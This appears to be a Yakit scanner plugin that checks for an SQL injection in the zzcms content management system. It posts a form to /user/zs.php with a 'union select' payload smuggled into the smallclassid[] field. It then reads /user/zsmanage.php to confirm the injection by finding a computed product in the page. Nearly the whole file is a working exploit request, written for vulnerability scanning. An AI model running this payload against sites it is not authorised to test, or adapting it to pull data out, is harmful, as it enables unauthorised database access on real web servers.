yakit.AutoInitYakit()

handleCheck = func(target,port){
    var url
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)
    level=["","low","middle","high","critical"]
    if isTls {
        url="https://"+addr
    }else{
        url="http://"+addr
    }
    vulnable=false

    reference="zzcms zsmanage sqli 漏洞"
    severity="未填写"
    type="漏洞"
    r2 = randn(40000,44800)
    r1 = randn(40000,44800)
    r0 = str.RandStr(6)

    poc_url_r0= url + `/user/zs.php?do=save`
    req_r0, _ := http.NewRequest("POST",poc_url_r0,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),
    http.header(`Content-Type`,`application/x-www-form-urlencoded`),
    http.body(`proname=`+ parseStr(r0) +`&tz=1%E4%B8%87%E4%BB%A5%E4%B8%8B&prouse=`+ parseStr(r0) +`&sx%5B%5D=&sx%5B%5D=&sm=`+ parseStr(r0) +`&province=%E5%85%A8%E5%9B%BD&city=%E5%85%A8%E5%9B%BD%E5%90%84%E5%9C%B0%E5%8C%BA&xiancheng=&cityforadd=&img=%2Fimage%2Fnopic.gif&flv=&zc=&yq=&action=add&Submit=%E5%A1%AB%E5%A5%BD%E4%BA%86%EF%BC%8C%E5%8F%91%E5%B8%83%E4%BF%A1%E6%81%AF&smallclassid[]=1&smallclassid[]=2)%20union%20select%20`+ parseStr(r1) +`*`+ parseStr(r2) +`%23`),)
    breq,_=http.dump(req_r0)
    resp_r0, err := http.Do(req_r0)
    die(err)
    bresp,_=http.dump(resp_r0)
    header, body = poc.Split(bresp)
    r0_flag = false
    if resp_r0.StatusCode == 200{
        r0_flag = true
    }

    poc_url_r1= url + `/user/zsmanage.php`
    req_r1, _ := http.NewRequest("GET",poc_url_r1,http.noredirect(),
    http.header("Content-Type", `application/x-www-form-urlencoded`),)
    breq,_=http.dump(req_r1)
    resp_r1, err := http.Do(req_r1)
    die(err)
    bresp,_=http.dump(resp_r1)
    header, body = poc.Split(bresp)
    r1_flag = false
    if resp_r1.StatusCode == 200 && str.Contains(string(body),parseStr(parseStr(r1 * r2))){
        r1_flag = true
    }

    poc_url=poc_url_r1
    if r0_flag && r1_flag{
        vulnable = true
    }
    if vulnable {
            yakit.Info("FOUND INFO for %v %v",reference,type)
            risk.NewRisk(
                url, risk.severity(severity), 
                risk.title(sprintf("FOUND %v %v",reference,type)),
                risk.titleVerbose(sprintf("%v %v",reference,type)),
                risk.type(type), risk.typeVerbose(type),
                risk.details({
                    "request": breq,
                    "response": bresp,
                    "url": poc_url,
                }),
            )
        }
    return
}
handle = func(result) {
    if !result.IsOpen(){
        return
    }
    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
}
